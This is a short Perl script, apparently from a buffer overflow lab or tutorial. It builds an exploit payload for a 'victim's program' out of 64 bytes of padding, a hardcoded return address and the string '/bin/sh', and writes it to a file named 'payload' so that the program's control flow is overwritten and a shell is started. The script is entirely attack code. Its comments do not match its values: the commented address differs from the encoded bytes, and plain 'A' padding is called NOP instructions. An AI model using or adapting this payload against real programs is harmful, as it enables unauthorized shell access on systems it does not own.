# This address must match the buffer variable of the victim's program */
my $retaddr = "\x40\x83\x04\x08"; #0xbffff218
my $space = " ";
my $cmd = "/bin/sh";

# Fill NOP instruction
my $pad = "A" x 64;

# Input string to our victim's program
my $arg = $pad.$retaddr.$space.$cmd;

# Let us store the input string to a file
open OUT, "> payload";
print OUT $arg;
close OUT;
